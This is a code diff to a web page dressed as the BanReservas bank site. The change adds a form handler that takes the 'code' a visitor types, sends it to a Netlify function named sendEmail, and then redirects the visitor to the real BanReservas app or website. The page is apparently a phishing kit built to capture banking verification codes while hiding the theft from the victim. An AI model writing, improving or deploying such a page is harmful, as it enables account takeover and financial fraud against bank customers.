@@ -103,18 +103,39 @@
     <footer>© 2025 BanReservas. Todos los derechos reservados.</footer>
 
     <script>
-        document.getElementById('codeForm').addEventListener('submit', function (e) {
-            e.preventDefault();
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    document.getElementById('codeForm').addEventListener('submit', async function (e) {
+        e.preventDefault(); // Evita el envío tradicional del formulario
 
-            if (isMobile) {
-                // Redirigir a la aplicación móvil de BanReservas (usando su URL personalizada)
-                window.location.href = 'banreservas://';
+        const code = document.getElementById('code').value;
+
+        try {
+            // Envía el código al backend usando fetch
+            const response = await fetch('/.netlify/functions/sendEmail', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ code }),
+            });
+
+            if (response.ok) {
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+                if (isMobile) {
+                    // Redirigir a la aplicación móvil de BanReservas
+                    window.location.href = 'banreservas://';
+                } else {
+                    // Redirigir a la página oficial de BanReservas
+                    window.location.href = 'https://www.banreservas.com/';
+                }
             } else {
-                // Redirigir a la página oficial de BanReservas
-                window.location.href = 'https://www.banreservas.com/';
+                alert('Error al enviar el código. Por favor, inténtelo de nuevo.');
             }
-        });
-    </script>
+        } catch (error) {
+            console.error('Error:', error);
+            alert('Hubo un problema al procesar la solicitud.');
+        }
+    });
+</script>
 </body>
 </html>
